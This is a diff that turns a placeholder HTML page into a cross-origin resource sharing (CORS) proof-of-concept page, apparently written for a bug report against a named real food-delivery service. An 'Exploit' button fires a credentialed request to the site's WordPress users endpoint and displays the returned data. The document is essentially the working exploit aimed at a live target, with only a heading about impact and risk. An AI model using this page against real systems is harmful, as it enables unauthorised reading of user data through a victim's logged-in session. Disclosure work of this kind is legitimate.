@@ -1,11 +1,61 @@
-<!DOCTYPE html>
+<!DOCTYPE HTML>
 <html>
-<body>
+    <head>
+            <title>CORS POC</title>
+            <script>
+                    function cors(){
+                        var xhttp =new XMLHttpRequest();
+                            xhttp.onreadystatechange = function(){
+                                if(this.readyState == 4 && this.status == 200){
+                                    document.getElementById("demo").innerHTML =alert(this.responseText);
+                                }
+                            }
+                            xhttp.open("GET", "https://kurye.yemeksepeti.com/?rest_route=/wp/v2/users",true);
+                            xhttp.withCredentials =true;
+                            xhttp.send();
+                    }
+            </script>
+            <style type="text/css">
+                .button {
+                    background-color:black;
+                    border: 3 px solid seagreen;
+                    color:white;
+                    padding: 15px 32px;
+                    text-align:center;
+                    transition-duration:0.4s;
+                    text-decoration:none;
+                    display: inline-block;
+                    font-size:20px;
+                    border-radius:50%;
 
-<h1>My First Heading</h1>
 
-<p>My first paragraph.</p>
+
+                }
+                .button:hover {
+                    background-color:aquamarine;
+                    color:red;
+                }
+                </style>
+    </head>
+    <body style ="background-color: aquamarine;">
+        <center>
+            <h1>CORS POC by kc4k</h1>
+            <h3>Exploit Butonuna Tıklıyorum.</h3>
+            <div id="demo">
+                <button class ="button"type="button"onclick="cors()">Exploit</button>
+
+            </div>
+
+            <br><br><br>
+            <h2>Impact and Risk</h2>
+            <marquee>CORS Misconfiguration</marquee>
+            <h2>yemeksepeti</h2>
+            <h3>URL:https://kurye.yemeksepeti.com/?rest_route=/wp/v2/users</h3>
+            
+        </center>
+
+
 
 </body>
-</html>
 
+</html>
